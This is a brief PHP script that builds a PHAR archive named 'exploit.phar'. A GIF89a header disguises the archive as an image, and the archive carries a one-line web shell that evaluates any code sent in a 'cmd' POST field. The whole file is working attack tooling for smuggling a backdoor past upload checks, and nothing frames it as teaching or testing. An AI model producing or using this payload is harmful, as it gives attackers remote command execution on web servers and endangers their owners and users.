<?php
class PharBuilder {
    public function build() {
        $phar = new Phar('exploit.phar');
        $phar->startBuffering();
        $phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
        $phar->addFromString('shell.txt', '<?php @eval($_POST["cmd"]);?>');
        $phar->stopBuffering();
    }
}
$builder = new PharBuilder();
$builder->build();
echo "PHAR created\n";
?>
